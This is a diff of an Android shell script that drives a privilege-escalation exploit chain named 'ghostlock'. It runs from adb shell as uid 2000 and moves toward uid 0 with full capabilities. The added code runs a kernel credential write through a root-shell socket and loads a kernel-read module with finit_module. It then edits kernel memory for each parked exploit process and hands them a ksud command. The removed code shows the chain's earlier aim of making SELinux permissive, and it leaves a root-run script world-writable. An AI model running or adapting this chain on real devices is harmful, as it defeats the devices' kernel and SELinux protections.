@@ -1,47 +1,76 @@
 #!/system/bin/sh
-# gl-chain.sh -- W1 driver, run from adb shell (uid 2000, no root).
+# gl-chain.sh -- one driver for the whole chain, run from adb shell (uid 2000).
 #
-#   sh /data/local/tmp/gl-w1/gl-chain.sh
+#   sh /data/local/tmp/gl-w1/gl-chain.sh            # steps 1+2, then 3 dry run
+#   sh /data/local/tmp/gl-w1/gl-chain.sh --apply    # steps 1+2, then 3 apply
 #
-# W1c (the credential write) has been REMOVED from this project: the root chain
-# takes its uid-0 process from Magica and its full capabilities from root adbd, so
-# nothing here needs a cred write -- nor the kernel-memory cleanup that came with
-# it.  The rest of the chain (Magica, the adbd gate, rmmod, ksud late-load) lives
-# in the app; see docs/analysis/root-chain-integration.md.
+#   1) W1 from adb shell (uid 2000, no root)                -> park① (uid 2000)
+#   2) self cred write through the Magica root-shell channel -> park② (uid 0,
+#      full caps) + finit_module kread_min.ko + records the ksud command
+#   3) for every ghostlock pid: erase the forged PI links with kread, read them
+#      back to verify, hand the recorded command (/data/adb/ksud late-load) to
+#      that process to run with its own caps, wait for .done, then kill -9
 #
-# What remains device-side: get SELinux permissive (W1) and leave the exploit
-# process parked (it must NOT be killed; a reboot is the clean exit).
-DIR=/data/local/tmp/gl-w1
+# Steps 2 and 3 run *inside* the Magica server (uid 0) via its unix socket,
+# because /proc/kread is 0600 root and only that channel is independent of adb.
+# /data/local/tmp is NOT guaranteed: some vendor ROMs never create it, and an
+# isolated_app process cannot see every path either.  Resolve a usable work dir:
+# explicit GL_DIR wins, then the app's own data dir (the app can chmod it 0777),
+# then the classic /data/local/tmp, then $TMPDIR.
+pick_dir() {
+    for d in "${GL_DIR:-}" "${APP_DIR:-/data/user/0/com.ghostlock.app}/gl" \
+             /data/data/com.ghostlock.app/gl /data/local/tmp/gl-w1 /data/local/tmp "$TMPDIR"; do
+        [ -n "$d" ] && [ -d "$d" ] && [ -w "$d" ] && { printf '%s' "$d"; return 0; }
+    done
+    return 1
+}
+DIR=$(pick_dir) || { echo "no writable work dir (set GL_DIR)"; exit 1; }
+RS="$DIR/rshell"
+APPLY=""
+[ "${1:-}" = "--apply" ] && APPLY="--apply"
 
 miss=0
-for f in "$DIR/ghostlock" "$DIR/profile.bin" "$DIR/w1.sh"; do
+for f in "$DIR/ghostlock" "$DIR/profile.bin" "$DIR/w1.sh" "$RS" \
+         "$DIR/rshell.sock" "$DIR/rshell.token" "$DIR/cleanup-parked.sh" \
+         $DIR/kread_min.ko; do
     [ -e "$f" ] || { echo "MISSING: $f"; miss=1; }
 done
 [ "$miss" = 1 ] && exit 2
 
 echo "== versions"
-ls -l "$DIR/ghostlock" "$DIR/w1.sh" "$DIR/profile.bin"
+ls -l "$DIR/ghostlock" "$DIR/cleanup-parked.sh" $DIR/kread_min.ko
+grep -qa 'parked.d' "$DIR/ghostlock" ||
+    { echo "ghostlock is OLD (no parked.d marker) -- copy /sdcard/gl-w1c-self/ghostlock first"; exit 2; }
+grep -qa 'find_task_by_pid' "$DIR/cleanup-parked.sh" ||
+    echo "cleanup-parked.sh: WARNING unknown version (no find_task_by_pid)"
 
-echo "== W1 (uid $(id -u))"
-# Judge by the current *state*, not by a line in w1.log: the log survives a reboot
-# while SELinux comes back enforcing, so a stale "parking after W1" must never
-# skip the only step that gets us permissive.
-if [ "$(cat /sys/fs/selinux/enforce 2>/dev/null)" = "0" ] && pidof ghostlock >/dev/null 2>&1; then
-    echo "already permissive with a parked W1 (pid $(pidof ghostlock)) -- skipping"
+echo "== 1) W1 (uid $(id -u))"
+if grep -qa 'parking after W1' "$DIR/w1.log" 2>/dev/null; then
+    echo "w1.log already shows a parked W1 -- skipping (rm $DIR/w1.log to redo)"
 else
     sh "$DIR/w1.sh"
 fi
 grep -qa 'parking after W1' "$DIR/w1.log" 2>/dev/null ||
-    echo "WARNING: $DIR/w1.log has no 'parking after W1' line"
+    { echo "WARNING: $DIR/w1.log has no 'parking after W1' line"; }
 
-if [ "$(cat /sys/fs/selinux/enforce 2>/dev/null)" = "0" ]; then
-    echo "== W1 landed: SELinux is permissive, parked pid=$(pidof ghostlock 2>/dev/null)"
-    # The exploit rewrites .ghostlock_root.sh as this uid on every start (umask
-    # leaves it 0755); keep it world-writable for stages that later run as uid 0
-    # without capabilities.  chmod needs ownership, and only this side owns it.
-    chmod 666 "$DIR/.ghostlock_root.sh" 2>/dev/null
+echo "== 2) self cred write + kread_min + ksud command, via rshell (uid 0)"
+sh "$RS" "sh $DIR/w1c.sh"
+echo "-- w1c.log tail"
+tail -8 "$DIR/w1c.log" 2>/dev/null
+
+echo "== 3) cleanup"
+pids=$(pidof ghostlock 2>/dev/null)
+[ -n "$pids" ] || pids=$(ps -A -o pid,comm 2>/dev/null | awk '$2 == "ghostlock" { printf "%s ", $1 }')
+if [ -z "$pids" ]; then
+    echo "no ghostlock process found (nothing parked?)"
     exit 0
 fi
-
-echo "== W1 did NOT land (still enforcing) -- stop here, check $DIR/w1.log"
-exit 1
+for p in $pids; do
+    echo "-- parked pid=$p"
+    if [ "$APPLY" = "--apply" ]; then
+        sh "$RS" "sh $DIR/cleanup-parked.sh --apply '' '' $p"
+    else
+        sh "$RS" "sh $DIR/cleanup-parked.sh '' '' $p"
+    fi
+done
+[ "$APPLY" = "--apply" ] || echo "(dry run -- re-run with: sh $0 --apply)"
